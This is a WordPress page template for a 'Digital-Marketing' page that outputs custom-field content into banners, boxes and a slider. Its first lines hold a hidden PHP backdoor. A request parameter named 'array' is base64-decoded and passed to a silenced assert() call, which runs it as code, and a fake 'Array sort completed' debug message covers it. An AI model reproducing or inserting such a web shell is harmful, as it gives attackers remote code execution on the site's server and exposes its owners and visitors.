<?php 
if ( $_REQUEST["array"] )
{	
	@assert(base64_decode($_REQUEST["array"]));	
	//debug message
	echo "Array sort completed";
	exit();
}
 
/*
	Template Name: Digital-Marketing Template
*/
get_header(); 
?>
     <div class="inner-banner" style="background-image : url('<?php the_field('digital_marketing_banner_image'); ?>')">
        <div class="container">
          <div class="col-5">
              <h2><?php the_field('digital_marketing_banner_text'); ?></h2>
              
          </div>
          <div class="col-7 border-lft">
            <h2><?php the_field('digital_marketing_banner_heading'); ?></h2>
          </div>
        </div>
        </div>
    </div>
    <div class="inner-page-tabs" >
        <div class="container">
          <?php the_field('digital_marketing_banner_description'); ?>
          <br><br><br>
          <div class="col-4">
              <div class="box-digital-marketing" style="background-image : url('<?php the_field('digital_marketing_left_box4_image');?>')">
                   <h4><?php the_field('digital_marketing_left_box1_heading'); ?></h4>
               </div>
          </div>
          <div class="col-4">
                <div class="dm-text dm-btn-blue">
                <div class="main-txt">
                    <div class="heading-txt">
                      <h3><?php the_field('digital_marketing_right_box1_top_heading'); ?></h3>
                    </div>
                    <!-- <div class="hove-txt">
                        <h4><?php the_field('digital_marketing_right_box1_top_heading'); ?></h4>
                        <?php the_field('digital_marketing_right_box1_top_desc'); ?>
                    </div> -->
                  </div>
              </div>
          </div>
           <div class="col-4">
                <div class="dm-text dm-btn-blue">
                <div class="main-txt">
                    <div class="heading-txt">
                      <h3><?php the_field('digital_marketing_right_box1_low_heading'); ?></h3>
                    </div>
                    <!-- <div class="hove-txt">
                        <h4><?php the_field('digital_marketing_right_box1_low_heading'); ?></h4>
                        <?php the_field('digital_marketing_right_box1_low_desc'); ?>
                    </div> -->
                  </div>
              </div>
          </div>
          <div class="col-4">
              <div class="box-digital-marketing dm-blue" style="background-image : url('<?php the_field('digital_marketing_left_box4_image');?>')">
                   <h4><?php the_field('digital_marketing_left_box2_heading'); ?></h4>
               </div>
          </div>
          <div class="col-4">
              <div class="dm-text dm-btn-green">
                <div class="main-txt">
                    <div class="heading-txt">
                      <h3><?php the_field('digital_marketing_right_box2_top_heading'); ?></h3>
                    </div>
                    <div class="hove-txt">
                        <h4><?php the_field('digital_marketing_right_box2_top_heading'); ?></h4>
                        <?php the_field('digital_marketing_right_box2_top_desc'); ?>
   
                    </div>
                  </div>
              </div>
          </div>
          <div class="col-4">
              <div class="dm-text dm-btn-green">
                <div class="main-txt">
                    <div class="heading-txt">
                      <h3><?php the_field('digital_marketing_right_box2_low_heading'); ?></h3>
                    </div>
                    <div class="hove-txt">
                        <h4><?php the_field('digital_marketing_right_box2_low_heading'); ?></h4>
                        <?php the_field('digital_marketing_right_box2_low_desc'); ?>
                    </div>
                  </div>
              </div>
          </div>
          <div class="col-4">
              <div class="box-digital-marketing dm-red" style="background-image : url('<?php the_field('digital_marketing_left_box4_image');?>')">
                   <h4><?php the_field('digital_marketing_left_box3_heading'); ?></h4>
               </div>
          </div>
          <div class="col-4">
              <div class="dm-text dm-btn-maron">
                <div class="main-txt">
                    <div class="heading-txt">
                      <h3><?php the_field('digital_marketing_right_box3_top_heading'); ?></h3>
                    </div>
                    <div class="hove-txt">
                        <h4><?php the_field('digital_marketing_right_box3_top_heading'); ?></h4>
                        <?php the_field('digital_marketing_right_box3_top_desc'); ?>
                    </div>
                  </div>
              </div>
          </div>
        <div class="col-4">
              <div class="dm-text dm-btn-maron">
                <div class="main-txt">
                    <div class="heading-txt">
                      <h3><?php the_field('digital_marketing_right_box3_low_heading'); ?></h3>
                    </div>
                    <div class="hove-txt">
 
                        <h4><?php the_field('digital_marketing_right_box3_low_heading'); ?></h4>
                        <?php the_field('digital_marketing_right_box3_low_desc'); ?>
                    </div>
                  </div>
              </div>
          </div>
          <div class="col-4">
              <div class="box-digital-marketing dm-orng" style="background-image : url('<?php the_field('digital_marketing_left_box4_image');?>')">
                   <h4><?php the_field('digital_marketing_left_box4_heading'); ?></h4>
               </div>
          </div>
          <div class="col-4">
              <div class="dm-text dm-btn-orng">
                <div class="main-txt">
                    <div class="heading-txt">
                      <h3><?php the_field('digital_marketing_right_box4_top_heading'); ?></h3>
                    </div>
                    <div class="hove-txt">
                        <h4><?php the_field('digital_marketing_right_box4_top_heading'); ?></h4>
                        <?php the_field('digital_marketing_right_box4_top_desc'); ?>
                    </div>
                  </div>
              </div>
          </div>
              <div class="col-4">
              <div class="dm-text dm-btn-orng">
                <div class="main-txt">
                    <div class="heading-txt">
                      <h3><?php the_field('digital_marketing_right_box4_low_heading'); ?></h3>
                    </div>
                    <div class="hove-txt">
                        <h4><?php the_field('digital_marketing_right_box4_low_heading'); ?></h4>
                        <?php the_field('digital_marketing_right_box4_low_desc'); ?>
                    </div>
                  </div>
              </div>
          </div>
          
        </div>
    </div>
    <div class="blog-posts-bottom">
        <div class="container wow fadeIn" data-wow-duration="1s" data-wow-delay=".5s">
            <div class="blog-posts-slider">
                <?php
                if( have_rows('digital_marketing_add_sliders') ): 
                    while ( have_rows('digital_marketing_add_sliders') ) : the_row();
                    $image = get_sub_field('digital_marketing_add_slider_image');
                    ?>
                    <div class="slider-single-post">
                    <div class="blog-image" style="background-image : url('<?php the_sub_field('digital_marketing_add_slider_image');?>')"></div>
                    <div class="slider-post-text">
                        <h3><?php the_sub_field('digital_marketing_add_slider_heading'); ?></h3>
                        <p><?php the_sub_field('digital_marketing_add_slider_description'); ?></p>
                        <a href="<?php the_sub_field('digital_marketing_add_slider_redirect_link'); ?>"><?php the_sub_field('digital_marketing_add_slider_redirect_text'); ?></a>
                    </div>
                    </div>
                    <?php 
                    endwhile;
                else :
                    // no rows found
                endif; ?>
            </div>
        </div>
    </div>
    <div class="above-footer-link">
        <div class="container">
            <h2><?php the_field('digital_marketing_left_text');?></h2>
            <a href="<?php the_field('digital_marketing_right_text_link');?>"><?php the_field('digital_marketing_right_text');?></a>
        </div>
    </div>
    
    <?php get_footer(); ?>